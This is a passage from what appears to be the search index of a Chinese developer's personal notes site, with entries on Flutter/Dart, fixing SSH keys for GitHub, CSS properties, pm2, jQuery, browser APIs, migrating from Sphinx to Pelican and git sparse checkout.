风格适用于需要符合 iOS 设计规范的应用，它在 iOS 和 macOS 应用中非常受欢迎。 简单理解, Material 是偏Android的UI风格 Cupertino 是偏iOS的UI风格 控件状态 默认提供了 有状态控件 StatefulWidget 和 无状态控件 StatelessWidget 简单来说, 有状态控件 StatefulWidget 可以根据控件自动刷新, setState 方法可以触发控件刷新 增加包依赖 类似node 的 package.json , flutter 是通过 pubspec.yaml 来管理依赖包. 比如加入 路径处理模块的依赖. dependencies : path_provider : &#94;2.0.0 然后运行 flutter pub get 来安装依赖 flutter指令选项参考 pub get 安装依赖, 类似node的 npm install flutter pub get add 命令行添加依赖, 类似node的 npm install xxx ,\n这样就不用手动改 pubspec.yaml 文件了. 比如增加 add path_provider 和 file_selector 两个包. flutter pub add path_provider file_selector packages 早期版本就有的指令 get 与 pub get 类似, 都可以获取依赖 flutter packages get 功能基本相同, 早期版本只有 packages get .\n新版本中, 貌似即使使用的是 flutter packages get , 也会转换为 flutter pub get 一些模块/插件参考 path_provider 文件读取功能 file_selector 打开文件/目录选择器来选择文件/目录 可能遇到的问题 Error: Not a constant expression 我这里的原因是使用了 const , 但是上面传递的值不是 const 类型, 删掉 const 即可. 使用状态组件时, 状态类获取父类信息 使用 widget : widget 是一个特殊的变量，它是当前 State 对象所关联的 StatefulWidget 的实例。\n通过 widget ，可以访问 StatefulWidget 中定义的数据和方法。 另外还有一个 context 表示当前 BuildContext ，它包含了构建过程中的上下文信息，可以用来访问祖先小部件的属性和方法。","tags":"后端","url":"/yq-docs-rear-end-dart-flutter.html","loc":"/yq-docs-rear-end-dart-flutter.html"},{"title":"ssh","text":"选项参数 -T <addr> 测试与某个 addr 的连通性. 如 ssh -T git@github.com -v 查看建立连接时候的详细信息, 可以与 -T 一起使用 -V 版本信息 问题-RSA公钥无法连接github 是在 Windows10 上出现的. 多半是用了高版本的缘故 $ ssh -V\nOpenSSH_9.5p1, OpenSSL 3 .1.4 24 Oct 2023 不确定是 ssh 本身的版本还是啥. 按照以前的 ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\" 这样的方式生成好秘钥放到github上然后尝试连接的时候报错不对 $ ssh -T git@github.com\nThe authenticity of host 'github.com (20.205.243.166)' can 't be established. ED25519 key fingerprint is SHA256:xxxxxxxxxxxxx This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ' github.com ' ( ED25519 ) to the list of known hosts.\ngit@github.com: Permission denied ( publickey ) . 仔细观察发现使用的是 ED25519 算法, 且没找到地方更改... 再查看链接时详细信息, 发现 $ ssh -vT git@github.com\nOpenSSH_9.5p1, OpenSSL 3 .1.4 24 Oct 2023 debug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Authentications that can continue : publickey\ndebug1: Next authentication method: publickey\n\n...\n\ndebug1: Offering public key: /c/Users/yq/.ssh/id_rsa RSA SHA256:xxxxx\ndebug1: Authentications that can continue : publickey\ndebug1: Trying private key: /c/Users/yq/.ssh/id_ecdsa\ndebug1: Trying private key: /c/Users/yq/.ssh/id_ecdsa_sk\ndebug1: Offering public key: /c/Users/yq/.ssh/id_ed25519 ED25519 SHA256:xxx\ndebug1: Authentications that can continue : publickey\ndebug1: Trying private key: /c/Users/yq/.ssh/id_ed25519_sk\ndebug1: Trying private key: /c/Users/yq/.ssh/id_xmss\ndebug1: Trying private key: /c/Users/yq/.ssh/id_dsa\ndebug1: No more authentication methods to try.\ngit@github.com: Permission denied ( publickey ) . 发现果然是没有找 id_rsa 文件. 无奈只有使用 ssh-agent 手动加一下看看了... ssh-agent bash\nssh-add ~/.ssh/id_rsa 虽然这个文件好像默认是在的. 好吧, 还是不行... 然后生成 ED25519 的秘钥加到默认的 id_ed25519 也不行.\n最后单独把自己秘钥加一个才行... ssh-agent bash\nssh-add ~/.ssh/id_ed_github 丢. 个人感觉是, 在 Windows 上, 不支持将多个秘钥文件放在一个文件里面... (看输出有可能是因为是校验整个文件的hash值了).\n但是我记得在 MacOS/Linux 上是支持的. 但是... 退出 ``ssh-agent bash`` 就不行了 . 后续解决方法 方案一 在这个仓库手动处理(理论可以, 没测过) git config core.sshCommand \"ssh -i /path/to/private/key\" 方案二 配置config (亲测可行) 如果没有, 就新建 ~/.ssh/config 文件. 内容: Host github.com           # 别名，重要. 比如 ``ssh -Tv git@github.com`` 时候找的 `github.com`\nHostName github.com       # 重要, 别名对应的实际地址\nUser yq\nIdentityFile ~/.ssh/id_ed_github","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-SSH.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-SSH.html"},{"title":"border-radius","text":"设置元素的边框圆角效果, 使元素的边框角变得圆滑，而不是默认的直角。 border-radius 属性可以应用于元素的四个角，也可以应用于单个角。\n它接受一个或多个长度值或百分比值作为参数，用于指定圆角的半径大小。 常见使用方式和效果： 设置统一的圆角半径, 使 .element 元素的四个角都具有 10px 的圆角: .element {\n  border-radius: 10px;\n} 设置水平和垂直方向上不同的圆角半径, 使 .element 元素的左上角和右下角分别具有 10px 和 20px 的圆角。: .element {\n  border-radius: 10px 20px;\n} 设置单个角的圆角半径, 使 .element 元素的左上角具有 10px 的圆角，右下角具有 20px 的圆角，而其余两个角则保持直角: .element {\n  border-radius: 10px 0 0 20px;\n} CSS-Table圆角无效 当设置table的边框为圆角时无效 border-radius : 10px ; 这是因为table默认使用了 border-collapse : collapse 和 border-radius 不兼容。 需要设置 /* border-spacing: 0; */ border-collapse : separate ; 才能正常设置圆角","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html"},{"title":"user-select","text":"CSS设置元素不可被选中, 比如有时候你不想你的文字可以被选中. user-select : none CSS通用文字不可被选中 /* 设置文字不可选中 */ . unselectable-text { -webkit- user-select : none ; /* Safari/Chrome */ -moz- user-select : none ; /* Firefox */ -ms- user-select : none ; /* IE/Edge */ user-select : none ; }","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-user-select.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-user-select.html"},{"title":"pm2","text":"PM2是一个守护进程管理器，它将帮助您管理和保持应用程序联机 相关资源/参考 npm包(也有使用说明) https://www.npmjs.com/package/pm2 pm2 使用指南 安装 npm install pm2@latest -g # or yarn global add pm2 # 升级 PM2 #1、安装最新版本的 PM2 npm install pm2@latest -g #2、然后更新内存中的PM2 pm2 update 支持启动大多数不同语言的程序 pm2 start app.js\npm2 start bashscript.sh\npm2 start python-app.py --watch\npm2 start binary-file -- --port 1520 注解 如果 start 后不知道在哪, 可以 pm2 log app_name 查看日志 CLI参数选项 选项 startup 生成pm2启动脚本 save 报错当前程序列表为冻结文件, 便于下次重启机器时启动 unstartup 移除启动脚本 monit 监控信息. 如日志 logs [--json|--format] [flush|reloadLogs] APP-NAME 查看日志. --json 表示以json格式输出 --format 表示格式化内容 flush 刷新所有日志 reloadLogs 重载所有日志 describe <id|app_name> 查看指定 app 更多信息 stop <app_name|namespace|id|'all'|json_conf> 停止指定 app restart <app_name|namespace|id|'all'|json_conf> 重启指定 app delete <app_name|namespace|id|'all'|json_conf> 删除指定 app list 查看所有正常运行的 app reload all 在不停机的情况下更新应用程序 指令参数 --name <app_name> 指定 app name --watch 当文件变化时, 自动重启 --max-memory-restart <200MB> 设置应用程序重新加载的内存阈值 --log <log_path> 指定日志文件 --restart-delay <delay in ms> 自动重启的时候, 延时指定 ms --time 为日志添加时间前缀 --no-autorestart 不自动重启 app --cron <cron_pattern> 指定 cron表达式 来强制重启(Specify cron for forced restart) --no-daemon 附加到应用程序日志(Attach to application log).\n作为普通程序执行而不是守护进程. 普通参数 -- arg1 arg2 arg3 Pass extra arguments to the script 模块 使用pm2的日志循环模块 pm2 install pm2-logrotate","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-pm2.html","loc":"/yq-docs-front-end-node-Three--party-library-pm2.html"},{"title":"dart","text":"一种由 Google 开发的开源编程语言 安装 仅安装dart 可以直接用官网提供的指引安装, 参考: https://dart.cn/get-dart MacOS下安装 # Add the official tap. $ brew tap dart-lang/dart # Install the Dart SDK. $ brew install dart 若需要切换版本. # For example, to install Dart 3.1: $ brew install dart@3.1 # To switch between versions, unlink the current version and link the desired version. $ brew unlink dart@<old> && brew unlink dart@<new> && brew link dart@<new> Flutter框架内置安装 你还可以通过 Flutter 框架来安装 dart dart跟 Flutter 是息息相关的. Flutter 是由 dart 开发的一个UI框架. 安装 brew install --cask flutter 详情参考: Flutter 补充-IDEA的配置 当使用 flutter 安装得 dart 时, 在IDEA, 可以设置为 flutter 的路径,\n但是识别不到 dart. 无奈还是手动安装了SDK. brew install dart-sdk 因为 dart 已经被设置过的原因, 所以这里设置失败可以忽略 Running ` brew update --auto-update ` ... == > Fetching dart-sdk == > Downloading https://mirrors.ustc.edu.cn/homebrew-bottles/dart-sdk-3.3.3.sonoma.bottle.tar.gz ###################################################################################################################################################################### 100.0% == > Pouring dart-sdk-3.3.3.sonoma.bottle.tar.gz\nError: The ` brew link ` step did not complete successfully\nThe formula built, but is not symlinked into /usr/local\nCould not symlink bin/dart\nTarget /usr/local/bin/dart\nalready exists. You may want to remove it: rm '/usr/local/bin/dart' To force the link and overwrite all conflicting files: brew link --overwrite dart-sdk\n\nTo list all files that would be deleted: brew link --overwrite --dry-run dart-sdk\n\nPossible conflicting files are:\n/usr/local/bin/dart -> /usr/local/Caskroom/flutter/3.19.5/flutter/bin/dart == > Summary\n🍺 /usr/local/Cellar/dart-sdk/3.3.3: 988 files, 574 .6MB == > Running ` brew cleanup dart-sdk ` ...\nDisable this behaviour by setting HOMEBREW_NO_INSTALL_CLEANUP.\nHide these hints with HOMEBREW_NO_ENV_HINTS ( see ` man brew ` ) . 去配置还是失败.... 再研究了一下, 直接配置 Flutter 即可, 安装的 dart SDK 可以忽略了.... IDEA应该需要先安装插件才有这个选项. 我丢, 一直装不上, 但是都下载好了, 不用IDEA了. 还是老老实实用 Android Studio","tags":"后端","url":"/yq-docs-rear-end-dart.html","loc":"/yq-docs-rear-end-dart.html"},{"title":"Theia-拖动文件到编辑器","text":"theia中定义在 node_modules/@theia/core/src/browser/shell/application-shell.ts 下 ApplicationShell.createMainPanel dockPanel . node . addEventListener ( 'drop' , event => { if ( event . dataTransfer ) { const uris = this . additionalDraggedUris || ApplicationShell . getDraggedEditorUris ( event . dataTransfer ); if ( uris . length > 0 ) { uris . forEach ( openUri ); } else if ( event . dataTransfer . files ? . length > 0 ) { // the files were dragged from the outside the workspace Array . from ( event . dataTransfer . files ). forEach ( file => { if ( file . path ) { const fileUri = URI . fromComponents ({ scheme : 'file' , path : file.path , authority : '' , query : '' , fragment : '' }); openUri ( fileUri ); } }); } } }); theia有个毛病一直没解决, 从文件管理器拖动到编辑器中时,\n会先把路径复制到当前编辑器,\n再打开新的编辑器, github的issus上说是用的vscode的东西, 用的API识别不了...\n地址: Draging a File into the Editor Opens File _and_ Pastes Text","tags":"前端","url":"/yq-frontend-theia-drop.html","loc":"/yq-frontend-theia-drop.html"},{"title":"浏览器Window对象","text":"此文主要记录常用的 Window对象 提供的相关API. Window matchMedia() 语法: window.matchMedia(mediaQueryString) mediaQueryString MediaQueryList 的字符串形式 返回 检测 CSS 媒体查询 , 返回一个新的 MediaQueryList 对象，表示指定的媒体查询字符串解析后的结果 MediaQueryList 对象有以下两个属性 media: 查询语句的内容。 matches: 用于检测查询结果，如果文档匹配 media query 列表，值为 true，否则为 false。 MediaQueryList 对象还可以监听事件。\n通过监听，在查询结果发生变化时，就调用指定的回调函数。 方法 描述 addListener(functionref) 添加一个新的监听器函数，该函数在媒体查询的结果发生变化时执行。 removeListener(functionref) 从媒体查询列表中删除之前添加的监听器。如果指定的监听器不在列表中，则不执行任何操作。 参考: 菜鸟-Window matchMedia() 方法 window.scrollBy() window.scrollBy() 方法接受两个参数 第一个参数是水平方向上的滚动量（可以是负值） 第二个参数是垂直方向上的滚动量（也可以是负值）。如果你只想向下滚动，只关心第二个参数： // 向下滚动指定的像素数 window . scrollBy ({ top : 100 , // 向下滚动100像素 left : 0 // 水平方向不滚动 }); window.scrollTo() window.scrollTo() 方法也可以用于精确控制滚动位置。\n与 scrollBy() 不同的是，scrollTo() 方法设置的是最终的滚动位置而不是滚动量。 如果你知道想要滚动到的确切位置，可以使用这个方法： // 滚动到相对于文档顶部的指定位置 window . scrollTo ({ top : window . pageYOffset + 100 , // 从当前位置向下滚动100像素 left : 0 , // 水平方向不滚动 behavior : 'smooth' // 可选，如果你想要平滑滚动 }); window.location 当前窗口相关. 比如 // 获取当前页面的URL window . location . href // 获取当前页面的协议 window . location . protocol // 获取当前页面的域名 window . location . hostname // 获取当前页面的端口号 window . location . port // 获取当前页面的完整路径 window . location . pathname // 获取当前页面的查询字符串 window . location . search // 获取当前页面的锚点 window . location . hash","tags":"前端","url":"/yq-docs-front-end-Conceptual-browser-environment-Window.html","loc":"/yq-docs-front-end-Conceptual-browser-environment-Window.html"},{"title":"overflow","text":"使用不同的overflow值来实现垂直滚动条、水平滚动条，或者两者都有 垂直滚动条 overflow-y 当内容超出div的垂直空间时，显示垂直滚动条。 . div-class { overflow-y : scroll ; /* 只有当内容溢出时才显示垂直滚动条 */ } 或者，如果你想要在内容溢出时自动显示滚动条，并且当内容没有溢出时也不显示滚动条，可以使用auto： . div-class { overflow-y : auto ; } 水平滚动条 overflow-x 当内容超出div的水平空间时，显示水平滚动条。 . div-class { overflow-x : scroll ; /* 只有当内容溢出时才显示水平滚动条 */ } 或者使用auto： . div-class { overflow-x : auto ; } 同时添加垂直和水平滚动条 overflow 如果你想让div在内容溢出时同时显示垂直和水平滚动条，可以这样设置： . div-class { overflow : scroll ; /* 同时显示垂直和水平滚动条 */ } 使用auto： . div-class { overflow : auto ; } 隐藏滚动条，但仍然允许滚动 如果你想要隐藏滚动条，但仍然允许通过鼠标滚轮或其他方式进行滚动，可以设置overflow属性为hidden： . div-class { overflow : hidden ; } 注解 overflow: hidden; 将不允许内容溢出div，滚动条也不会显示。 滚动条样式见 伪元素","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-overflow.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-overflow.html"},{"title":"CSS伪元素","text":"概念说明见: 各种选择器 伪元素选择器一般使用两个冒号开头表示 像元素的滚动条设置就是用滚动条的伪元素 生效范围 伪元素主要在基于Webkit的浏览器中有效，如Chrome和Safari 常用的 ::before 在元素前面添加内容 滚动条相关 ::-webkit-scrollbar 滚动条背景 ::-webkit-scrollbar-button 滚动条按钮 ::-webkit-scrollbar-thumb 滚动条的滑块部分.\n滑块是用户用来滚动内容的可拖动部件。使用这个伪元素，你可以设置滑块的样式，如背景颜色、边框、圆角等。 ::-webkit-scrollbar-track 自定义滚动条的轨道（track）样式。\n即滚动条的滑动区域。轨道是滚动条的背景部分，通常在滑块（thumb）上下移动时保持静止。\n你可以使用这个伪元素来设置轨道的背景颜色、边框、圆角等样式。 ::-webkit-scrollbar-corner 自定义滚动条的角落（corner）的样式。\n这个角落是水平和垂直滚动条相交的地方。\n在大多数情况下，这个角落是隐藏的，除非你的滚动条同时支持水平和垂直滚动。\n你可以使用这个伪元素来设置角落的背景颜色、边框等样式。 ::marker 用于样式化列表项 <li> 中的标记 marker ，\n通常是 无序列表前面的项目符号、有序列表前面的数字。 对这个符号/数字的格式进行设置. 比如数字列表颜色的设置就是 ol :: marker { color : red ; }","tags":"前端","url":"/yq-docs-front-end-CSS-Pseudo-element.html","loc":"/yq-docs-front-end-CSS-Pseudo-element.html"},{"title":"字体文件导入","text":"现在大多图标/字体网站, 都提供了各种框架的图标使用.\n你可以通过引入其提供的框架, 简单的指定 class 名称,\n即可看到想要的效果 但是对于纯静态项目而言, 个人还是更喜欢使用 ::before 的 content 属性来使用字体图标.\n记录一下这个时候应该如何导入资源文件. 注解 使用的时候需要指定字体如 body{font-family: 'Font Awesome'} 直接css内导入 使用 @font-face 标签 @ font-face { font-family : 'Font Awesome' ; src : url ( '../fontawesome-free-6.5.1-web/webfonts/fa-brands-400.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-regular-400.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-solid-900.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-v4compatibility.woff2' ) format ( 'woff2' ); /* swap; 表示如果字体在一定时间内没有加载完成，将使用备用字体显示文本，一旦字体加载完成，就会切换到自定义字体。 */ font-display : swap ; /* 或者使用 'block' 或 'fallback' */ } 注解 woff2 相对于 ttf 体积更小, 压缩率更高, 且支持版权源信息. 从html预加载, 提供速度 使用 link 标签 < link rel = \"stylesheet\" href = \"/theme/fontawesome-free-6.5.1-web/css/all.min.css\" /> < link rel = \"preload\" as = \"font\" type = \"font/woff2\" crossorigin href = \"/theme/fontawesome-free-6.5.1-web/webfonts/fa-brands-400.woff2\" /> < link rel = \"preload\" as = \"font\" type = \"font/woff2\" crossorigin href = \"/theme/fontawesome-free-6.5.1-web/webfonts/fa-regular-400.woff2\" /> < link rel = \"preload\" as = \"font\" type = \"font/woff2\" crossorigin href = \"/theme/fontawesome-free-6.5.1-web/webfonts/fa-solid-900.woff2\" /> < link rel = \"preload\" as = \"font\" type = \"font/woff2\" crossorigin href = \"/theme/fontawesome-free-6.5.1-web/webfonts/fa-v4convertible.woff2\" /> Font Awesome导入的坑 第一次导入是使用的 直接css内导入 的方式,\n发现只能识别部分 unicode 字符. 后面看了下官方的css文件, 改成分开导入, 且引入ttf才正常. @ font-face { font-family : 'Font Awesome 6 Free Web' ; src : url ( '../fontawesome-free-6.5.1-web/webfonts/fa-regular-400.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-regular-400.ttf' ) format ( 'truetype' ); font-display : block ; unicode-range : U + F003 , U + F006 , U + F014 , U + F016-F017 , U + F01A-F01B , U + F01D , U + F022 , U + F03E , U + F044 , U + F046 , U + F05C-F05D , U + F06E , U + F070 , U + F087-F088 , U + F08A , U + F094 , U + F096-F097 , U + F09D , U + F0A0 , U + F0A2 , U + F0A4-F0A7 , U + F0C5 , U + F0C7 , U + F0E5-F0E6 , U + F0EB , U + F0F6-F0F8 , U + F10C , U + F114-F115 , U + F118-F11A , U + F11C-F11D , U + F133 , U + F147 , U + F14E , U + F150-F152 , U + F185-F186 , U + F18E , U + F190-F192 , U + F196 , U + F1C1-F1C9 , U + F1D9 , U + F1DB , U + F1E3 , U + F1EA , U + F1F7 , U + F1F9 , U + F20A , U + F247-F248 , U + F24A , U + F24D , U + F255-F25B , U + F25D , U + F271-F274 , U + F278 , U + F27B , U + F28C , U + F28E , U + F29C , U + F2B5 , U + F2B7 , U + F2BA , U + F2BC , U + F2BE , U + F2C0-F2C1 , U + F2C3 , U + F2D0 , U + F2D2 , U + F2D4 , U + F2DC ; } @ font-face { font-family : 'Font Awesome 6 Free Web' ; src : url ( '../fontawesome-free-6.5.1-web/webfonts/fa-solid-900.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-solid-900.ttf' ) format ( 'truetype' ); font-display : block ; } @ font-face { font-family : 'Font Awesome 6 Free Web' ; src : url ( '../fontawesome-free-6.5.1-web/webfonts/fa-v4compatibility.woff2' ) format ( 'woff2' ), url ( '../fontawesome-free-6.5.1-web/webfonts/fa-v4compatibility.ttf' ) format ( 'truetype' ); font-display : block ; unicode-range : U + F041 , U + F047 , U + F065-F066 , U + F07D-F07E , U + F080 , U + F08B , U + F08E , U + F090 , U + F09A , U + F0AC , U + F0AE , U + F0B2 , U + F0D0 , U + F0D6 , U + F0E4 , U + F0EC , U + F10A-F10B , U + F123 , U + F13E , U + F148-F149 , U + F14C , U + F156 , U + F15E , U + F160-F161 , U + F163 , U + F175-F178 , U + F195 , U + F1F8 , U + F219 , U + F27A ; } 注解 如果你只是想使用 unicode 字符集, 仅手动导入字体文件即可 如果你还需要用到 Font Awesome 提供的css样式, 那么不用手动导入字体, 仅导入css即可.\n(因为官方提供的all-css内已经导入了字体文件) 后续测试了一下, 分开导入时, 只导入 woff2 格式的文件, 也可以正常识别到. (估计所有 woff2 写一块导入有bug) 相关资源: Font Awesome官网: https://fontawesome.com/icons 可以在官网搜索想要的图标, 其中 unicode 的位置:","tags":"前端","url":"/yq-docs-front-end-CSS-font-file-import.html","loc":"/yq-docs-front-end-CSS-font-file-import.html"},{"title":"Dom-Document对象","text":"参考: HTML DOM Document 对象 在 HTML DOM (Document Object Model) 中 , 每一个元素都是 节点 document 代表整个文档对象 document.documentElement 返回文档的根节点 拓展-深浅色主题切换 依赖 HTMLElement.dataset 对象, 一般来说, dataset 属于只读属性, 可以通过其访问元素的 data-* 属性.\n如 dataset.theme 就代表元素的 dateset-theme 属性. 比如html根节点的 dataset-theme 为 dark 可以长这样 < html data-them = \"dark\" > ... </ html > html根节点的 dataset-theme 可以由以下方式获取 document . documentElement . dataset . theme 你可以通过这样的方式来动态切换主题 那么css样式怎么处理? 大致分为两步 分离深色浅色模式的样式, 更新为变量 将变量分别定义在 html[data-theme=\"dark\"]{} 与 html[data-theme=\"light\"]{} 中 如我有一个背景色, 在深色模式下为黑色 black ,\n浅色模式下为白色 while , 可以这样写 html [ data-theme = \"dark\" ] { --bg-color : black ; } html [ data-theme = \"light\" ] { --bg-color : white ; } body { background-color : var ( --bg-color ); } 当然, 子元素也可以通过加上前缀来直接判断样式 html [ data-theme = \"dark\" ] body { background-color : black ; } html [ data-theme = \"light\" ] body { background-color : white ; }","tags":"前端","url":"/yq-docs-front-end-Conceptual-dom-document.html","loc":"/yq-docs-front-end-Conceptual-dom-document.html"},{"title":"jQuery提供方法","text":"toggleClass() 对选择元素添加或移除指定的类. 语法 $ ( selector ). toggleClass ( classname , function ( index , currentclass ), switch ) 参数说明 classname 必需。规定添加或移除的一个或多个类名。如需规定若干个类，请使用空格分隔类名。 function(index,currentclass) 可选。规定返回需要添加/删除的一个或多个类名的函数。 index - 返回集合中元素的 index 位置。 currentclass - 返回被选元素的当前类名。 switch 可选。布尔值，规定是否仅仅添加（true）或移除（false）类。 如 $ ( \"button\" ). click ( function (){ $ ( \"p\" ). toggleClass ( \"main\" ); }); 当点击时, 如果 p 标签的类属性包含 main , 则移除 p 标签的类属性不包含 main , 则添加 hasClass() 判断是否存在某个类, 返回bool值 语法 $ ( selector ). hasClass ( classname ) 参数 classname 必需。规定需要在被选元素中查找的类。 如 $ ( \"button\" ). click ( function (){ alert ( $ ( \"p\" ). hasClass ( \"intro\" )); }); width() 获取或设置元素的内容宽度，不包括 padding、border 和 margin。 返回值为浮点数 outerWidth() 获取或设置元素的外部宽度，这包括元素的内容区域、padding 和 border，但不包括 margin。 返回值为整数 innerWidth() 获取或设置元素的内部宽度，这包括元素的内容区域和 padding，但不包括 border、margin。 返回值为整数 offsetWidth 如果你需要更精确的宽度值（包括小数点后的像素），你可以使用元素的 offsetWidth 属性(获取总高度浮点数, 不包括 margin )： 注解 offsetWidth 是一个 DOM 元素的属性，它表示元素的可见宽度，包括元素的内容区域、内边距（padding）和边框（border）。 // 获取元素的总宽度，包括 padding 和 border var totalWidth = $ ( '#your-element' )[ 0 ]. offsetWidth ; 返回值为浮点数 height() 获取元素内容高度(不包括padding、border、margin) 返回值为浮点数 outerHeight() 获取元素高度,\n包括内容、padding 和 border. 不包括margin 返回值为整数 innerHeight() 获取元素 内容高度 加 padding 的高度，而不包括 border、margin 返回值为整数 offsetHeight 获取元素的总高度，包括 padding 和 border. 不包括margin 返回值为浮点数 // 获取元素的总高度，包括 padding 和 border var totalHeight = $ ( '#your-element' )[ 0 ]. offsetHeight ;","tags":"前端","url":"/yq-docs-front-end-frame-jquery-jQuery-provided-methods.html","loc":"/yq-docs-front-end-frame-jquery-jQuery-provided-methods.html"},{"title":"记录将sphinx文档库迁移到pelican","text":"此前一直用的sphinx, 适合做文档教程, 一直写了几年个人文档.\n进来觉得这些记录不适合做成文档教程, 想改成博客, 就有了以下... 前路历程 sphinx直接做成博客方案 找了很久这个, 后面找到一个 ablog 拓展,\n可以直接配置在 sphinx 的 conf.py.\n但是由于是基于 sphinx 的主题, 所以后续修改主题比较麻烦.\n且内容较大时, 生成速度简直缓慢(sphinx本身的慢). 再加上博客本身不需要sphinx内置的文档结构生成.\n故后面就放弃了 ablog . 简单搜索了下博客框架, 最后还是选择了 pelican pelican没有sphinx的专有指令/角色 这个问题一直困扰了很久,\n因为此前一直用的 sphinx , 所以想当然认为像 toctree , literalinclude 等指令, doc , ref 等 role\n是 rst 本身就支持的. 直到我构建的时候, 看报错才知道并非如此. github上看了下, 可能是之前没人有这样的历程吧, 压根没有现有解决方案. 最后, 自己把自己文档遇到的内容, 简单通过 pelican 插件处理了一下,\n至于具体实现本身功能, 先这样弄, 后面慢慢来. pelican构建时模版翻译支持 这个也算是一个痛点, 模版是用的 Jinja 模版引擎. 此前虽然用过, 但没有系统搞过, 所以完全不知道国际化还需要安装插件.\n之道遇到报错: _ undeifned 后面的解决方案是. 安装 jinja2 的必须插件 pip install jinja2-pluralize-extension 在 pelicanconf.py 中配置多语言插件 PLUGIN_PATHS = [ \"plugins\" ] PLUGINS = [ \"i18n_subsites\" , # 多语言 ] i18n_subsites 可以在官方github仓库下载, 地址: pelican-plugins/i18n_subsites vscode没有纯粹的指令联想插件 有个 rst 官方插件, 不过是依赖sphinx的. 计划后面写到vscode拓展支持... 注解 更新. 已经做了插件支持, 地址: https://github.com/yanquer/vscode-rst-fragment 搜索功能 看了下其他主题有搜索的是用的 tipue search 然后就加了这个插件, 也在官方仓库下载 PLUGINS = [ \"i18n_subsites\" , # 多语言 \"tipue_search\" , ] 插件github地址: https://github.com/pelican-plugins/tipue-search 然后还要配置js跟相应的css. 一开始我直接把别人老仓库的js拿过来,\n改好主题后, 发现不支持中文搜索. 具体研究了下, 发现拿过来的是 3.0 的版本,\n要用最新的 5.1 才行,\n于是又去下好最新版, 修修改改, 终于支持了 中文搜索 可参考下载地址: https://cdnjs.com/libraries/Tipue-Search 图标 有些样式比如图标没法用原生html实现, 后面找到个 fontawesome 图标库, 但是全部引入感觉没必要, 因为我就用那么几个. 最后的措施是: 在 fontawesome 找好想要的图标 改下图标样式 复制图标的 svg, 保存到本地为图片使用. 另外找搜索图标的时候看到 用content来显示特殊图片的, 不过需要字体支持,\n可参考: https://www.cnblogs.com/ninama/p/16019777.html 缺失源信息 主要就是 作者, 事件, 路径 等信息. 本来想看看文件的mktime, 但是发现可能是跟git交互的原因吧,\n有git的同步啥的貌似会重新计算mk. 但是暂时也找不到其他方法, 就暂时只好用错误的mktime了. 其他信息写了个脚本来全部加. 编写rst文档时缺少指令提示 因为编写时候是在pelican项目, 所以需要禁用 sphinx 的语言服务器 esbonio \"esbonio.server.enabled\" : false 然后发现用不了指令提示, 主要是 docutil 相关的. 加之有时候手打的可能有拼写错误,\n就打算研究研究自定义个纯粹的指令提示插件. with long time... 直到准备写相关插件, 去看 rst 怎么实现的时候, 发现 reStructuredText 插件的功能是这样写的 { \"code\" : { \"prefix\" : \"code\" , \"body\" : \".. code-block:: ${1:language}\\n$0\" , \"description\" : \"Code\" , \"scope\" : \"source.rst\" }, \"image\" : { \"prefix\" : \"image\" , \"body\" : \".. image:: ${1:path}\\n$0\" , \"description\" : \"Image\" , \"scope\" : \"source.rst\" }, \"figure\" : { \"prefix\" : \"figure\" , \"body\" : \".. figure:: ${1:path}\\n\\n   $0\" , \"description\" : \"Figure\" , \"scope\" : \"source.rst\" }, ... 好吧, 是我用 .. 开始的触发方式错误. 注解 此前用 .. 能触发成功, 是因为 esbonio 服务器找的是 docutil 相关的提示(即使 esbonio 没启起来).\n我是觉得, pelican 不需要它且老会自动触发构建又没法成功, 所以给关了","tags":"文档","url":"/yq-doc-do-from-sp-to-pelican.html","loc":"/yq-doc-do-from-sp-to-pelican.html"},{"title":"仅克隆指定文件夹","text":"有时候想克隆某个仓库的指定的文件夹, 而非整个仓库 作为主模块 就是不会被其他仓库作为子仓库使用 创建一个与要clone的仓库同名或不同命的目录, 然后初始化仓库 mkdir content cd content\ngit init 添加远程仓库源 git remote add origin git@xxx.git 最重要的一步来了, 设置Sparse Checkout 为true, 才能支持单独拉文件夹 git config core.sparsecheckout true 将 想要克隆的文件夹 相对 根目录 的路径写入配置文件.\n比如source下两个docs1和docs2文件夹 echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout 然后再拉即可 git pull origin master 如果只想保留最新的文件而不要历史版本的文件，pull可以用git pull --dpeth 1命令，即\"浅克隆\"： $ git pull --depth 1 origin master 作为子模块 就是作为子仓库使用. 与上面差距不大.\n不过由于路径原因, 需要先设置子仓库 在父仓库设置子仓库 git submodule add -b $branch_name -- git@xxx.git content 这个只是为了加到 .gitmodules , 手动改的话, 貌似有时候会有问题.\n所以使用命令添加, 不过使用命令添加子仓库时, 会默认拉取所有信息.\n这个时候的信息是全量的. 与上面 不作为子仓库 不同之处就在这, 先进仓库目录, 然后清空所有 如果介意这一点, 可以研究研究直接手动将信息增加到 .gitmodules 会不会有问题 后续指令 git remote add origin git@xxx.git\ngit config core.sparsecheckout true echo \"source/docs\\nsource/docs2\" >> .git/info/sparse-checkout\ngit pull origin $branch_name core.sparsecheckout作用 支持 稀疏检出 , 即 本地版本库检出时不检出全部 ,\n只将指定的文件从本地版本库检出到工作区 可参考: 